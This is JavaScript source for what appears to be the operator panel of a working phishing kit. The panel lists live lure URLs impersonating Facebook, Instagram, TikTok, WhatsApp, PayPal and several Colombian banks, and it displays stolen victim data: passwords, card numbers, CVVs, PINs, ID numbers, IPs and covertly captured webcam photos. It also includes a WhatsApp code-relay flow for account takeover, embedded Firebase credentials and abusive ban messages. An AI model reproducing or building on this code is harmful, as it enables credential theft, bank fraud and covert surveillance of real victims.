import { initializeApp } from "https://www.gstatic.com/firebasejs/12.6.0/firebase-app.js";
import { getAuth, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/12.6.0/firebase-auth.js";
import {
  getFirestore, collection, getDocs, getDoc, query, where, orderBy, doc, updateDoc, addDoc, setDoc,
  onSnapshot, deleteDoc, serverTimestamp, writeBatch, limit
} from "https://www.gstatic.com/firebasejs/12.6.0/firebase-firestore.js";

const firebaseConfig = {
    apiKey: "AIzaSyBgqYhRV8CrmlMkr6yBF1DpE_zCgXIE660",
    authDomain: "panel-admi-633cd.firebaseapp.com",
    projectId: "panel-admi-633cd",
    storageBucket: "panel-admi-633cd.firebasestorage.app",
    messagingSenderId: "664308369374",
    appId: "1:664308369374:web:4342c3a417968b1d23bf4f"
};

const app  = initializeApp(firebaseConfig);
const auth = getAuth(app);
const db   = getFirestore(app);
const $id  = id => document.getElementById(id);

let miLinkId          = null;
let miUserDocId       = null;
let ultimoCambioNombre = null;
let isBanned          = false;
let banUntil          = 0;

const mensajeHistory  = {};
const BAN_100_AÑOS    = 200 * 365 * 24 * 60 * 60 * 1000;
let isGloballyBanned  = false;

// ============================================================
//  MENSAJE DE BANEO AL CHAT GLOBAL
// ============================================================
async function enviarMensajeBanGlobal(nombreUsuario) {
    try {
        await addDoc(collection(db, "chatMensajes"), {
            texto: `El usuario ${nombreUsuario} se autobaneó por rata`,
            usuario: "Sistema",
            uidRemitente: "sistema",
            fecha: serverTimestamp(),
            colorChat: "#ff0000",
            esMensajeSistema: true
        });
    } catch (error) {
        console.error("Error al enviar mensaje de baneo:", error);
    }
}

// ============================================================
//  ANTI-SPAM
// ============================================================
async function checkAntiSpam(texto, uidRemitente) {
    if (isGloballyBanned) {
        mostrarModalSpamBloqueado(200);
        return false;
    }
    let now = Date.now();
    const userRef  = doc(db, "panelUsers", uidRemitente);
    const userSnap = await getDoc(userRef);
    if (!userSnap.exists()) return false;
    const data = userSnap.data();
    let banUntilMs      = data.banUntil       ? data.banUntil.toMillis()       : 0;
    let lastMessageTime = data.lastMessageTime ? data.lastMessageTime.toMillis(): 0;
    let spamStreak      = data.spamStreak || 0;

    if (banUntilMs > now) {
        let años = Math.ceil((banUntilMs - now) / (365 * 24 * 3600000));
        mostrarModalSpamBloqueado(años);
        mostrarAvisoSpam(true, años);
        return false;
    }

    if (texto.length > 500) {
        await updateDoc(userRef, { banUntil: new Date(now + BAN_100_AÑOS) });
        mostrarModalSpamBan();
        mostrarAvisoSpam(true, 200);
        return false;
    }

    let diff = now - lastMessageTime;
    if (diff < 1800) {
        spamStreak += 1;
        if (spamStreak < 4) mostrarModalSpamProgreso(spamStreak);
    } else {
        spamStreak = 1;
    }

    if (spamStreak >= 4) {
        const nombreUsuario = $id("chatUsuario").value.trim() || "Anónimo";
        await updateDoc(userRef, { banUntil: new Date(now + BAN_100_AÑOS), spamStreak, lastMessageTime: new Date(now) });
        isGloballyBanned = true;
        deshabilitarInteraccion();
        await enviarMensajeBanGlobal(nombreUsuario);
        mostrarModalSpamBan();
        mostrarAvisoSpam(true, 200);
        await eliminarMensajesSpamGlobalmente(uidRemitente);
        return false;
    }

    await updateDoc(userRef, { lastMessageTime: new Date(now), spamStreak });
    mostrarAvisoSpam(false);

    if (!mensajeHistory[uidRemitente]) mensajeHistory[uidRemitente] = [];
    mensajeHistory[uidRemitente].push({ texto: texto.trim(), timestamp: now });
    if (mensajeHistory[uidRemitente].length > 20) mensajeHistory[uidRemitente].shift();

    const ultimos4 = mensajeHistory[uidRemitente].slice(-4);
    if (ultimos4.length === 4 && ultimos4.every(m => m.texto === ultimos4[0].texto)) {
        const nombreUsuario = $id("chatUsuario").value.trim() || "Anónimo";
        await updateDoc(userRef, { banUntil: new Date(now + BAN_100_AÑOS) });
        isGloballyBanned = true;
        deshabilitarInteraccion();
        await enviarMensajeBanGlobal(nombreUsuario);
        mostrarModalRataDetectada();
        mostrarAvisoSpam(true, "200 AÑOS");
        await eliminarMensajesSpamGlobalmente(uidRemitente);
        return false;
    }

    return true;
}

async function eliminarMensajesSpamGlobalmente(uidRemitente) {
    const batch = writeBatch(db);
    const q = query(
        collection(db, "chatMensajes"),
        where("uidRemitente", "==", uidRemitente),
        orderBy("fecha", "desc"),
        limit(10)
    );
    const snapshot = await getDocs(q);
    snapshot.forEach(docSnap => {
        batch.update(docSnap.ref, { texto: "[Este mensaje fue eliminado]", eliminado: true });
    });
    await batch.commit();
}

function deshabilitarInteraccion() {
    document.querySelectorAll('button, input, a, textarea, select').forEach(el => {
        el.disabled = true;
        el.style.pointerEvents = 'none';
        el.style.opacity = '0.5';
    });
    document.body.style.cursor = 'not-allowed';
}

// ============================================================
//  MODALES ANTI-SPAM
// ============================================================
function mostrarModalRataDetectada() {
    let div = document.createElement("div");
    div.style.cssText = "position:fixed;inset:0;background:rgba(0,0,0,0.98);z-index:99999;display:flex;justify-content:center;align-items:center;";
    div.innerHTML = `
    <div style="background:#000;border:6px solid #f00;padding:60px;border-radius:20px;box-shadow:0 0 100px #f00;text-align:center;font-family:monospace;color:#f00;font-size:32px;text-shadow:0 0 30px #f00;animation:shake 0.4s infinite;">
        <div style="font-size:80px;margin-bottom:20px;">RATA DETECTADA</div>
        <div style="font-size:28px;color:#ff0;">BAN DE 200 AÑOS</div>
        <div style="font-size:20px;margin:20px 0;color:#fff;">Spam repetitivo = Eliminado para siempre</div>
        <div style="font-size:18px;color:#888;">Tus últimos mensajes han sido eliminados.</div>
    </div>`;
    document.body.appendChild(div);
    setTimeout(() => div.remove(), 8000);
}

function mostrarModalSpamBan() {
    let div = document.createElement("div");
    div.style.cssText = "position:fixed;inset:0;background:rgba(0,0,0,0.95);z-index:99999;display:flex;justify-content:center;align-items:center;";
    div.innerHTML = `
    <div style="background:#000;border:4px solid #f00;padding:40px 50px;border-radius:15px;box-shadow:0 0 50px #f00;text-align:center;font-family:monospace;color:#f00;font-size:24px;text-shadow:0 0 20px #f00;">
        <div style="font-size:32px;margin-bottom:20px;animation:shake 0.5s infinite;">RATA</div>
        <div style="font-size:28px;">VIOLASTE LAS REGLAS</div>
        <div style="font-size:22px;color:#ff0;">POR SPAM, RATA ASQUEROSA</div>
        <div style="font-size:16px;color:#888;margin-top:15px;">Ban: 200 AÑOS</div>
    </div>`;
    document.body.appendChild(div);
    setTimeout(() => div.remove(), 4000);
}

function mostrarModalSpamProgreso(streak) {
    let div = document.createElement("div");
    div.style.cssText = "position:fixed;top:20px;right:20px;background:rgba(255,0,0,0.8);color:#fff;padding:10px 15px;border-radius:8px;z-index:9999;font-family:monospace;border:2px solid #f00;animation:fadeInOut 2s forwards;";
    div.innerHTML = `Racha spam: ${streak}/4 – ¡Cuidado, rata!`;
    document.body.appendChild(div);
    setTimeout(() => div.remove(), 2000);
}

function mostrarModalSpamBloqueado(años) {
    let div = document.createElement("div");
    div.style.cssText = "position:fixed;inset:0;background:rgba(0,0,0,0.95);z-index:99999;display:flex;justify-content:center;align-items:center;";
    div.innerHTML = `
    <div style="background:#000;border:4px solid #f00;padding:30px 40px;border-radius:12px;box-shadow:0 0 40px #f00;text-align:center;font-family:monospace;color:#f00;font-size:20px;text-shadow:0 0 15px #f00;animation:shake 0.5s infinite;">
        <div style="font-size:26px;margin-bottom:10px;">ACCESO DENEGADO</div>
        <div style="color:#ff0;font-size:16px;">Bloqueado por ${años} año(s)</div>
    </div>`;
    document.body.appendChild(div);
    setTimeout(() => div.remove(), 3000);
}

function mostrarAvisoSpam(activo, texto = null) {
    let aviso = $id("avisoSpam");
    if (!aviso) {
        aviso = document.createElement("div");
        aviso.id = "avisoSpam";
        aviso.style.cssText = "position:fixed;top:10px;left:50%;transform:translateX(-50%);background:rgba(255,0,0,0.9);color:#fff;padding:8px 16px;border-radius:8px;z-index:9999;font-family:monospace;display:none;";
        document.body.appendChild(aviso);
    }
    if (activo) {
        aviso.textContent = "Baneado Por Rata 🐭🖕Tu madre es Puta ❤️";
        aviso.style.display = "block";
    } else {
        aviso.style.display = "none";
    }
}

const styleAnim = document.createElement('style');
styleAnim.textContent = `
    @keyframes shake { 0%,100%{transform:translateX(0)} 25%{transform:translateX(-10px)} 75%{transform:translateX(10px)} }
    @keyframes fadeInOut { 0%{opacity:1} 100%{opacity:0} }
    @keyframes parpadeo { 0%,100%{opacity:1} 50%{opacity:0.5} }
`;
document.head.appendChild(styleAnim);

// ============================================================
//  ENABLE / DISABLE UI
// ============================================================
function disableUI() {
    $id("chatSend").disabled = true;
    $id("chatSend").style.opacity = "0.5";
    $id("btnMostrarAcortador").disabled = true;
    $id("fakeSelect").style.pointerEvents = "none";
    $id("fakeSelect").style.opacity = "0.5";
    const btnCopiar = document.querySelector('[onclick="copiarLink()"]');
    if (btnCopiar) { btnCopiar.disabled = true; btnCopiar.style.opacity = "0.5"; }
    document.querySelectorAll('.btn').forEach(b => { b.disabled = true; b.style.opacity = "0.5"; });
    mostrarAvisoSpam(true, Math.ceil((banUntil - Date.now()) / (365 * 24 * 3600000)));
}

function enableUI() {
    $id("chatSend").disabled = false;
    $id("chatSend").style.opacity = "1";
    $id("btnMostrarAcortador").disabled = false;
    $id("fakeSelect").style.pointerEvents = "auto";
    $id("fakeSelect").style.opacity = "1";
    const btnCopiar = document.querySelector('[onclick="copiarLink()"]');
    if (btnCopiar) { btnCopiar.disabled = false; btnCopiar.style.opacity = "1"; }
    document.querySelectorAll('.btn').forEach(b => { b.disabled = false; b.style.opacity = "1"; });
    mostrarAvisoSpam(false);
}

// ============================================================
//  AUTH — CARGA DE USUARIO
// ============================================================
onAuthStateChanged(auth, async (user) => {
    if (!user) { location.replace("login.html"); return; }
    localStorage.setItem("usuarioNombre", user.email);
    if ($id("userLogged")) $id("userLogged").textContent = user.email;
    miUserDocId = user.uid;
    miLinkId    = user.uid;

    const userRef = doc(db, "panelUsers", miUserDocId);
    onSnapshot(userRef, (snap) => {
        if (snap.exists()) {
            const data = snap.data();
            const now  = Date.now();
            if (data.banUntil && data.banUntil.toMillis() > now) {
                if (!isBanned) {
                    isBanned  = true;
                    banUntil  = data.banUntil.toMillis();
                    disableUI();
                    mostrarModalSpamBloqueado(Math.ceil((banUntil - now) / (365 * 24 * 3600000)));
                }
            } else {
                if (isBanned) { isBanned = false; enableUI(); }
            }
        }
    });

    generarEnlacesUnicos();
    iniciarListenerVictimas();
    actualizarOnline();
    iniciarChat();
    iniciarLluviaBinaria();
    cargarFondosGuardados();
    await cargarUltimoCambioNombre();
});

// ============================================================
//  ENLACES ÚNICOS
// ============================================================
const plantillas = [
    { nombre: "Facebook Basico",              url: "https://x2p4a4.mimo.run/index.html" },
    { nombre: "Facebook Estandar",            url: "https://facebook-estndar.glegogle5341-af7.workers.dev/" },
    { nombre: "TikTok",                       url: "https://tik-tok.glegogle5341-af7.workers.dev/" },
    { nombre: "Nequi Tarjeta",               url: "https://ufakmi.mimo.run/index.html" },
    { nombre: "Instagram",                    url: "https://instagram.glegogle5341-af7.workers.dev/" },
    { nombre: "Facebook Escritorio",          url: "https://facebook-escritorio.glegogle5341-af7.workers.dev/" },
    { nombre: "PayPal Estandar",             url: "https://estandarpay.glegogle5341-af7.workers.dev/" },
    { nombre: "PayPal Basico",               url: "https://paypal-basico.glegogle5341-af7.workers.dev/" },
    { nombre: "Escotia Bank",                url: "https://scotiabank.glegogle5341-af7.workers.dev/" },
    { nombre: "whatsapp Normal",             url: "https://grupo7privado.glegogle5341-af7.workers.dev/" },
    { nombre: "whatsapp XxX Avance",         url: "https://whaadvance.glegogle5341-af7.workers.dev/" },
    { nombre: "Nequi Login Encuesta",        url: "https://nequi-login.glegogle5341-af7.workers.dev/" },
    { nombre: "BBVA en mantenimiento",       url: "https://2gb4lr.mimo.run/index.html" },
    { nombre: "BetPlay",                     url: "https://betplay.glegogle5341-af7.workers.dev/" },
    { nombre: "Banco de Bogota",             url: "https://bogota.glegogle5341-af7.workers.dev/" },
    { nombre: "Bancolombia en mantenimiento",url: "https://bancolombia.glegogle5341-af7.workers.dev/?uid=uid_1771535158464_7gnn5tpq88q" },
    { nombre: "Camara Zoom Clases Hacking",  url: "https://camaraz00m.glegogle5341-af7.workers.dev/" },
    { nombre: "Camara xXx Hacking",         url: "https://sara-fogosa.glegogle5341-af7.workers.dev/" },
    { nombre: "Yandex",                      url: "https://yandex.glegogle5341-af7.workers.dev/" },
    { nombre: "Garena Tarjeta en mantenimiento", url: "https://5mpser.mimo.run/index.html" },
    { nombre: "Facebook Advance(2)X",        url: "https://uz1w0f.mimo.run/index.html" },
    { nombre: "QR Hacking web",              url: "https://1xru5c.mimo.run/index.html" }
];

function generarEnlacesUnicos() {
    const fake  = $id("fakeSelect");
    const lista = $id("optionsList");
    fake.textContent  = "Selecciona un enlace";
    fake.dataset.url  = "";
    lista.innerHTML   = "";
    plantillas.forEach(p => {
        const urlFull = `${p.url}?uid=${miLinkId}`;
        const item    = document.createElement("div");
        item.className   = "optionItem";
        item.textContent = p.nombre;
        item.onclick = () => {
            fake.textContent  = p.nombre;
            fake.dataset.url  = urlFull;
            lista.style.display = "none";
        };
        lista.appendChild(item);
    });
    fake.onclick = () => lista.style.display = (lista.style.display === "block") ? "none" : "block";
}

document.addEventListener("click", e => {
    if (!$id("fakeSelect")?.contains(e.target) && !$id("optionsList")?.contains(e.target)) {
        if ($id("optionsList")) $id("optionsList").style.display = "none";
    }
});

window.copiarLink = () => {
    const url = $id("fakeSelect").dataset.url || plantillas[0].url + "?uid=" + miLinkId;
    navigator.clipboard.writeText(url);
    $id("mensajeCopiado").style.display = "block";
    setTimeout(() => $id("mensajeCopiado").style.display = "none", 2000);
};

// ============================================================
//  ACORTADOR
// ============================================================
$id("btnMostrarAcortador").onclick = () => $id("ventanaAcortador").style.display = "block";
$id("btnCerrarAcortador").onclick  = () => $id("ventanaAcortador").style.display = "none";

$id("acortadorBtn").onclick = async () => {
    const url   = $id("acortadorUrlOriginal").value.trim();
    const alias = $id("acortadorUrlAlias").value.trim();
    if (!url) return $id("acortadorResultado").textContent = "Falta URL";
    const res  = await fetch(`https://is.gd/create.php?format=json&url=${encodeURIComponent(url)}${alias ? `&shorturl=${alias}` : ""}`);
    const data = await res.json();
    if (data.shorturl) {
        $id("acortadorResultado").innerHTML = `<span style="color:#0f0">${data.shorturl}</span> <button class="btn" onclick="navigator.clipboard.writeText('${data.shorturl}');mostrarCopiadoAcortador()">Copiar</button>`;
        let links = JSON.parse(localStorage.getItem("misEnlaces") || "[]");
        links.unshift(data.shorturl);
        localStorage.setItem("misEnlaces", JSON.stringify(links));
    } else {
        $id("acortadorResultado").textContent = data.errormessage || "Error";
    }
};

window.mostrarCopiadoAcortador = () => {
    const msg = $id("mensajeCopiadoAcortador");
    if (msg) { msg.style.display = "block"; setTimeout(() => msg.style.display = "none", 3000); }
};

// ============================================================
//  BOTONES MENÚ
// ============================================================
window.mostrarContacto  = () => $id("contacto").style.display  = $id("contacto").style.display  === "block" ? "none" : "block";
window.mostrarRegistros = () => $id("registros").style.display = $id("registros").style.display === "block" ? "none" : "block";
window.togglePanel      = () => $id("panel").classList.toggle("abierto");

// ============================================================
//  MIS ENLACES ACORTADOS
// ============================================================
window.mostrarMisEnlaces = () => {
    const links = JSON.parse(localStorage.getItem("misEnlaces") || "[]");
    const lista = $id("enlacesLista");
    lista.innerHTML = links.length
        ? links.map(l => `<div><a href="${l}" target="_blank" style="color:#0f0">${l}</a></div>`).join("")
        : "<p style='color:#f30'>Sin enlaces</p>";
    $id("ventanaMisEnlaces").style.display = "block";
};
window.cerrarMisEnlaces = () => $id("ventanaMisEnlaces").style.display = "none";

// ============================================================
//  VÍCTIMAS — LISTENER
// ============================================================
function iniciarListenerVictimas() {
    if (!miUserDocId) return;
    const colRef = collection(db, "panelUsers", miUserDocId, "victimas");
    onSnapshot(query(colRef, orderBy("fecha", "desc")), mostrarVictimas);
}

function mostrarVictimas(snap) {
    const cont = $id("registros");
    if (!cont) return;

    if (snap.empty) {
        cont.innerHTML = `
        <button class="btn-red-clear" onclick="vaciarMisVictimas()">Vaciar todas</button>
        <div style="color:#ff8800;padding:25px;text-align:center;font-size:15px;">
            Aún no tienes víctimas
        </div>`;
        return;
    }

    let html = `
    <button class="btn-red-clear" onclick="vaciarMisVictimas()">Vaciar todas</button>
    <div style="max-height:60vh;overflow-y:auto;padding:6px;">`;

    snap.forEach(d => {
        const v     = d.data();
        const fecha = v.fecha ? new Date(v.fecha.toDate()).toLocaleString() : "Ahora";
        const docId = d.id;
        const tpl   = (v.template || "").toLowerCase().trim();

        // ══════════════════════════════════════════════════
        //  DETECCIÓN EXACTA POR TEMPLATE
        // ══════════════════════════════════════════════════

   const esWA_VipGroup  = tpl === "wa vip group";
const esWA_Advance   = tpl.includes("whaadvance") || tpl.includes("xxxx avance");
const esWA_Codigo    = esWA_VipGroup || esWA_Advance;

        // QR Hacking
        const esQR = tpl.includes("qr");

        // Fotos capturadas
        const esFoto = tpl.includes("stealth") || tpl.includes("camara") ||
                       tpl.includes("camera")  || tpl.includes("zoom")   ||
                       tpl.includes("xxx")     || tpl.includes("fogosa") ||
                       !!v.fotoOriginal        || !!v.fotoMiniatura;

        // Credenciales puras
        const esTikTok    = tpl.includes("tiktok");
        const esInstagram = tpl.includes("instagram") || tpl.includes("ig");
        const esFacebook  = tpl.includes("facebook") || tpl.includes("fb");
        const esNequi     = tpl.includes("nequi");
        const esBanco     = tpl.includes("banco") || tpl.includes("bbva") ||
                            tpl.includes("bancolombia") || tpl.includes("scotiabank") ||
                            tpl.includes("escotia");
        const esPayPal    = tpl.includes("paypal");
        const esBetPlay   = tpl.includes("betplay");
        const esYandex    = tpl.includes("yandex");
        const esGarena    = tpl.includes("garena");

        // Color borde
        const borderColor = esWA_Codigo ? "#25D366"
                          : esQR        ? "#00bfff"
                          : esFoto      ? "#ff6600"
                          : "#00ff00";

        html += `
        <div style="
            background:rgba(0,255,0,0.07);
            border:1px solid ${borderColor};
            border-radius:8px;
            padding:0px;
            margin:8px 0;
            font-size:13px;
            line-height:1.6;
            box-shadow:0 0 8px ${borderColor}44;
        ">
        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;">
            <strong style="color:${borderColor};font-size:14px;">${v.template || "Phishing"}</strong>
            <small style="color:#fff;">${fecha}</small>
        </div>`;

        if (v.ip) html += `<div>IP: <span style="color:#666;font-size:11px;">${v.ip}</span></div>`;

        // ══════════════════════════════════════════════════
        //  BLOQUE 1 — FOTOS (Cámara / Stealth / Zoom / xXx)
        // ══════════════════════════════════════════════════
        if (esFoto) {
            const hayFoto = v.fotoMiniatura || v.fotoOriginal;
            if (hayFoto) {
                const thumb    = v.fotoMiniatura || v.fotoOriginal;
                const original = v.fotoOriginal  || v.fotoMiniatura;

                // Guardamos en atributo data para evitar problemas con comillas
                html += `
                <div style="text-align:center;margin:10px 0;">
                    <div style="
                        display:inline-block;
                        background:rgba(255,102,0,0.1);
                        border:2px solid #ff6600;
                        border-radius:10px;
                        padding:10px;
                    ">
                        <div style="color:#ff6600;font-size:11px;margin-bottom:6px;font-weight:bold;">
                            📸 FOTO CAPTURADA ${v.count ? `(${v.count}/5)` : ""}
                        </div>
                        <img
                            src="${thumb}"
                            data-original="${original}"
                            class="foto-victima-thumb"
                            style="
                                width:150px;
                                height:150px;
                                object-fit:cover;
                                border-radius:8px;
                                border:2px solid #ff6600;
                                cursor:pointer;
                                display:block;
                                margin:0 auto;
                                box-shadow:0 0 20px #ff660077;
                            "
                            title="Click para ver en grande"
                        />
                        <div style="margin-top:8px;display:flex;gap:6px;justify-content:center;">
                            <button
                                data-original="${original}"
                                class="btn-ver-foto"
                                style="
                                    background:#ff6600;
                                    color:#000;
                                    border:none;
                                    padding:5px 12px;
                                    border-radius:4px;
                                    font-size:11px;
                                    font-weight:bold;
                                    cursor:pointer;
                                ">
                                🔍 Ver completa
                            </button>
                            <button
                                data-original="${original}"
                                data-docid="${docId}"
                                class="btn-descargar-foto"
                                style="
                                    background:#333;
                                    color:#ff6600;
                                    border:1px solid #ff6600;
                                    padding:5px 12px;
                                    border-radius:4px;
                                    font-size:11px;
                                    cursor:pointer;
                                ">
                                ⬇ Descargar
                            </button>
                        </div>
                    </div>
                </div>`;
            } else {
                html += `<div style="color:#ff6600;font-size:12px;margin:8px 0;">📸 Foto aún no disponible</div>`;
            }
            if (v.deviceId) {
                html += `<div style="color:#555;font-size:10px;margin-top:4px;word-break:break-all;">📱 ${v.deviceId}</div>`;
            }
        }

        // ══════════════════════════════════════════════════
        //  BLOQUE 2 — WHATSAPP CON CÓDIGO 8 DÍGITOS
        //  (Grupo VIP / whatsapp Normal / whatsapp Advance)
        // ══════════════════════════════════════════════════
        else if (esWA_Codigo) {
            if (v.numero) {
                html += `
                <div style="margin:6px 0;">
                    Número: <b style="color:#25D366;font-size:15px;">${v.numero}</b>
               <button onclick="navigator.clipboard.writeText('${v.numero}');mostrarNotif('✅ Número copiado')"
    style="background:none;border:1px solid #25D366;color:#25D366;padding:1px 7px;border-radius:3px;font-size:10px;cursor:pointer;margin-left:6px;
    position:relative;top:-20px;">
    Copiar
</button>
                </div>`;
            }

            html += `
            <div style="
                margin-top:-21px;
                padding:1px;
                background:rgba(37,211,102,0.08);
                border-radius:6px;
                border:1px solid #25D366;
            ">
                <label style="color:#ccc;font-size:11px;display:block;margin-bottom:6px;font-weight:bold;">
                    INGRESA EL CÓDIGO:
                </label>
                <div style="display:flex;gap:6px;">
                    <input
                        type="text"
                        id="input-code-${docId}"
                        placeholder="ABCD1234"
                        maxlength="8"
                        oninput="this.value=this.value.toUpperCase().replace(/[^A-Z0-9]/g,'')"
                        style="
                            flex:1;
                            background:#000;
                            border:2px solid #25D366;
                            color:#25D366;
                            padding:10px;
                            border-radius:4px;
                            font-family:monospace;
                            font-size:10px;
                            letter-spacing:4px;
                            text-align:center;
                            outline:none;
                        "
                    />
                    <button
                        onclick="enviarCodigoAVictima('${docId}')"
                        style="
                            background:#25D366;
                            color:#000;
                            border:none;
                            padding:10px 2px;
                            border-radius:4px;
                            font-weight:bold;
                            cursor:pointer;
                            font-size:9px;
                            white-space:nowrap;
                        ">
                        ➤ ENVIAR
                    </button>
                </div>
                <div id="status-${docId}" style="font-size:10px;margin-top:6px;color:#888;text-align:center;">
                    ${v.status === "mostrando_codigo"
                        ? `<span style="color:#25D366">✅ Código mostrándose en pantalla de la víctima</span>`
                        : "⌛ Esperando envío de código..."}
                </div>
            </div>`;
        }

        // ══════════════════════════════════════════════════
        //  BLOQUE 3 — QR HACKING (código azul)
        // ══════════════════════════════════════════════════
        else if (esQR) {
            if (v.numero) html += `<div style="margin:4px 0;">Número: <b style="color:#00bfff;">${v.numero}</b></div>`;

            html += `
            <div style="
                margin-top:10px;
                padding:12px;
                background:rgba(0,191,255,0.08);
                border-radius:6px;
                border:1px solid #00bfff;
            ">
                <div style="color:#00bfff;font-size:12px;font-weight:bold;margin-bottom:8px;">
                    🔐 QR HACKING — CÓDIGO DE ACCESO
                </div>

                ${v.codigo ? `
                <div style="
                    background:rgba(0,191,255,0.15);
                    border:1px solid #00bfff;
                    border-radius:4px;
                    padding:8px;
                    margin-bottom:10px;
                    font-size:13px;
                    color:#00bfff;
                    text-align:center;
                    letter-spacing:3px;
                    font-family:monospace;
                    font-weight:bold;
                ">
                    ✅ Código activo: ${v.codigo}
                </div>` : `
                <div style="color:#666;font-size:11px;margin-bottom:10px;text-align:center;">
                    ⌛ Esperando código...
                </div>`}

                <label style="color:#ccc;font-size:11px;display:block;margin-bottom:6px;font-weight:bold;">
                    CÓDIGO DE 8 DÍGITOS:
                </label>
                <div style="display:flex;gap:6px;">
                    <input
                        type="text"
                        id="input-code-${docId}"
                        placeholder="X8KJ-P2M9"
                        maxlength="8"
                        oninput="this.value=this.value.toUpperCase().replace(/[^A-Z0-9]/g,'')"
                        style="
                            flex:1;
                            background:#000;
                            border:2px solid #00bfff;
                            color:#00bfff;
                            padding:10px;
                            border-radius:4px;
                            font-family:monospace;
                            font-size:18px;
                            letter-spacing:4px;
                            text-align:center;
                            outline:none;
                        "
                    />
                    <button
                        onclick="enviarCodigoAVictima('${docId}')"
                        style="
                            background:#00bfff;
                            color:#000;
                            border:none;
                            padding:10px 16px;
                            border-radius:4px;
                            font-weight:bold;
                            cursor:pointer;
                            font-size:14px;
                            white-space:nowrap;
                        ">
                        ➤ ENVIAR
                    </button>
                </div>
                <div id="status-${docId}" style="font-size:10px;margin-top:6px;color:#888;text-align:center;">
                    ${v.status === "mostrando_codigo"
                        ? `<span style="color:#00bfff">✅ Código enviado a la víctima</span>`
                        : "⌛ Esperando envío..."}
                </div>
            </div>`;
        }

        // ══════════════════════════════════════════════════
        //  BLOQUE 4 — CREDENCIALES PURAS
        //  (Facebook, TikTok, Instagram, Nequi, Bancos, etc.)
        // ══════════════════════════════════════════════════
else {
    const labelUser = (esTikTok || esInstagram) ? "Usuario" : "Correo/Email";

    if (v.numero) html += `
    <div style="display:flex;align-items:center;gap:8px;margin:3px 0;">
        <span style="color:#aaa;font-size:12px;">Número:</span>
        <b style="color:#0ff;font-size:13px;">${v.numero}</b>
        <button onclick="navigator.clipboard.writeText('${v.numero}');mostrarNotif('✅ Copiado')"
            style="background:none;border:1px solid #0ff;color:#0ff;padding:2px 8px;border-radius:4px;font-size:11px;cursor:pointer;transition:all .2s;">
            Copiar
        </button>
    </div>`;

            if (v.correo || v.usuario) html += `
            <div style="margin:5px 0;display:flex;align-items:center;gap:8px;flex-wrap:wrap;">
                <span>${labelUser}: <b style="color:#fff;">${v.correo || v.usuario}</b></span>
                <button onclick="navigator.clipboard.writeText('${(v.correo||v.usuario||"").replace(/'/g,"\\'")}');mostrarNotif('✅ Copiado')"
                    style="background:none;border:1px solid #fff;color:#fff;padding:1px 7px;border-radius:3px;font-size:10px;cursor:pointer;">
                    Copiar
                </button>
            </div>`;

            if (v.contraseña || v.password) html += `
            <div style="margin:5px 0;display:flex;align-items:center;gap:8px;flex-wrap:wrap;">
                <span>Contraseña: <b style="color:#fff;">${v.contraseña || v.password}</b></span>
                <button onclick="navigator.clipboard.writeText('${(v.contraseña||v.password||"").replace(/'/g,"\\'")}');mostrarNotif('✅ Copiado')"
                    style="background:none;border:1px solid #fff;color:#f0f;padding:1px 7px;border-radius:3px;font-size:10px;cursor:pointer;">
                    Copiar
                </button>
            </div>`;

            // Campos bancarios / tarjeta
            if (v.tarjeta)    html += `<div style="margin:4px 0;">Tarjeta: <b style="color:#fa0;">${v.tarjeta}</b></div>`;
            if (v.cvv)        html += `<div style="margin:4px 0;">CVV: <b style="color:#fa0;">${v.cvv}</b></div>`;
            if (v.expiracion) html += `<div style="margin:4px 0;">Expiración: <b style="color:#fa0;">${v.expiracion}</b></div>`;
            if (v.pin)        html += `<div style="margin:4px 0;">PIN: <b style="color:#fa0;">${v.pin}</b></div>`;
            if (v.cedula)     html += `<div style="margin:4px 0;">Cédula: <b style="color:#fa0;">${v.cedula}</b></div>`;
        }

        // ── Botón eliminar individual ──────────────────────
        html += `
        <div style="margin-top:10px;text-align:right;">
            <button onclick="eliminarVictimaIndividual('${docId}')"
                style="
                    background:#1a0000;
                    border:1px solid #f00;
                    color:#f00;
                    padding:3px 10px;
                    border-radius:4px;
                    font-size:11px;
                    cursor:pointer;
                ">
                🗑 Eliminar
            </button>
        </div>
        </div>`;
    });

    html += `</div>`;
    cont.innerHTML = html;

    // ══════════════════════════════════════════════════════
    //  EVENT LISTENERS PARA FOTOS (con data-attribute)
    //  Se asignan DESPUÉS de insertar el HTML en el DOM
    // ══════════════════════════════════════════════════════
    document.querySelectorAll(".foto-victima-thumb, .btn-ver-foto").forEach(el => {
        el.addEventListener("click", function() {
            const original = this.dataset.original || this.src;
            abrirVisorFoto(original);
        });
    });

    document.querySelectorAll(".btn-descargar-foto").forEach(el => {
        el.addEventListener("click", function() {
            const original = this.dataset.original;
            const docId    = this.dataset.docid;
            const link     = document.createElement("a");
            link.href      = original;
            link.download  = `foto_${docId}_${Date.now()}.jpg`;
            link.click();
            mostrarNotif("📸 Descargando foto...");
        });
    });
}

// ══════════════════════════════════════════════════════════════
//  VISOR DE FOTO EN GRANDE — Modal overlay completo
// ══════════════════════════════════════════════════════════════
function abrirVisorFoto(srcOriginal) {
    // Eliminar visor previo si existe
    const previo = document.getElementById("visorFotoOverlay");
    if (previo) previo.remove();

    const overlay = document.createElement("div");
    overlay.id = "visorFotoOverlay";
    overlay.style.cssText = `
        position:fixed;
        inset:0;
        background:rgba(0,0,0,0.97);
        z-index:999999;
        display:flex;
        flex-direction:column;
        justify-content:center;
        align-items:center;
        cursor:pointer;
    `;

    overlay.innerHTML = `
        <div style="position:relative;max-width:95vw;max-height:90vh;">
            <img
                src="${srcOriginal}"
                style="
                    max-width:95vw;
                    max-height:85vh;
                    object-fit:contain;
                    border-radius:10px;
                    border:3px solid #ff6600;
                    box-shadow:0 0 60px #ff660088;
                    display:block;
                "
            />
            <button
                id="btnCerrarVisor"
                style="
                    position:fixed;
                    top:15px;
                    right:15px;
                    background:#ff6600;
                    color:#000;
                    border:none;
                    border-radius:50%;
                    width:40px;
                    height:40px;
                    font-size:20px;
                    font-weight:bold;
                    cursor:pointer;
                    z-index:1000000;
                    display:flex;
                    align-items:center;
                    justify-content:center;
                    box-shadow:0 0 20px #ff6600;
                ">✕</button>
            <a
                href="${srcOriginal}"
                download="foto_capturada_${Date.now()}.jpg"
                style="
                    position:fixed;
                    bottom:20px;
                    left:50%;
                    transform:translateX(-50%);
                    background:#ff6600;
                    color:#000;
                    padding:10px 25px;
                    border-radius:8px;
                    font-weight:bold;
                    text-decoration:none;
                    font-size:14px;
                    box-shadow:0 0 20px #ff6600;
                    z-index:1000000;
                ">
                ⬇ Descargar foto
